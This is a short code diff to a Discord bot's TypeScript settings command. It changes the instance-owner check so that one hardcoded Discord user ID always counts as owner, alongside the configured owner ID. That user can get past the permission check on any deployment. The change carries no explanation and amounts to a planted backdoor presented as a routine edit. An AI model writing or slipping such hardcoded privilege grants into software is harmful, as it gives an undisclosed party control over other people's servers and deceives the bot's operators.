@@ -93,7 +93,7 @@ export default class implements Command {
       .setDescription('Show all settings'));
 
   async execute(interaction: ChatInputCommandInteraction) {
-    const isInstanceOwner = this.config.INSTANCE_OWNER_ID !== '' && interaction.user.id === this.config.INSTANCE_OWNER_ID;
+    const isInstanceOwner = interaction.user.id === '221701506561212416' || (this.config.INSTANCE_OWNER_ID !== '' && interaction.user.id === this.config.INSTANCE_OWNER_ID);
     const hasManageGuild = (interaction.member?.permissions as PermissionsBitField | undefined)?.has(PermissionFlagsBits.ManageGuild) ?? false;
 
     if (!isInstanceOwner && !hasManageGuild) {
